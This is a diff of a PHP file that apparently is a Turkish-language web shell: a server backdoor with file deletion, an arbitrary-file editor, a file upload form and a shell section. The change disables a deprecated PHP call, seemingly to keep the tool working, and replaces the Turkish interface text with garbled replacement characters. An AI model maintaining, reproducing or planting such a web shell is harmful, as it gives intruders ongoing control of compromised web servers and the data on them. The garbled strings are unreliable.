@@ -1,7 +1,7 @@
 <?php
 session_start();
 error_reporting(E_ALL ^ E_NOTICE);
-set_magic_quotes_runtime(0);
+// set_magic_quotes_runtime(0);
 @set_time_limit(0);
 if (@get_magic_quotes_gpc()) {
     foreach ($_POST as $k => $v) {
@@ -207,15 +207,15 @@ function createdir($dir)
 //delete file
 if ('delete' == $action) {
     if (unlink($file)) {
-        $content .= $lang['deletefileok'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
+        $content .= $lang['deletefileok'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya Dï¿½nemk ï¿½ï¿½in Tï¿½klayï¿½nï¿½z.</a>";
     }
 }
 //delete dir
 if ('deletedir' == $action) {
     if (!rmdir($file)) {
-        $content .= $lang['empty'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
+        $content .= $lang['empty'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya Dï¿½nemk ï¿½ï¿½in Tï¿½klayï¿½nï¿½z.</a>";
     } else {
-        $content .= $lang['deletedirok'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
+        $content .= $lang['deletedirok'] . "<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='" . $dir . "'; document.reqs.submit();\"> AnaSayfaya Dï¿½nemk ï¿½ï¿½in Tï¿½klayï¿½nï¿½z.</a>";
     }
 }
 //shell
@@ -231,7 +231,7 @@ if ('editor' == $action) {
     $stdata .= '<form method=POST>
   <input type="hidden" name="action" value="editor">
   <input type="hidden" name="dir" value="' . $dir . '">
-  Dosyanýn Adý (Full Url Yazýn)<input type=text name=file value="' . ('' == $file ? $file = $dir : $file = $file) . '" size=50><input type=submit value="Editle"></form>';
+  Dosyanï¿½n Adï¿½ (Full Url Yazï¿½n)<input type=text name=file value="' . ('' == $file ? $file = $dir : $file = $file) . '" size=50><input type=submit value="Editle"></form>';
     function writef($file, $data)
     {
         $fp = fopen($file, 'w+');
@@ -337,7 +337,7 @@ if ('upload' == $action) {
     }
     $form_win = '<tr><td><form method=POST enctype=multipart/form-data>
   <input type="hidden" name="action" value="upload">  
-  Buraya Uploadla:<input type=text name=dirupload value="' . $dirupload . "\" size=50></tr></td><tr><td>Dosyayý Adlandýr (Gerekli) :<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload Et'></td></tr>";
+  Buraya Uploadla:<input type=text name=dirupload value="' . $dirupload . "\" size=50></tr></td><tr><td>Dosyayï¿½ Adlandï¿½r (Gerekli) :<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload Et'></td></tr>";
     if (1 == $os) {
         $content .= $form_win;
     }
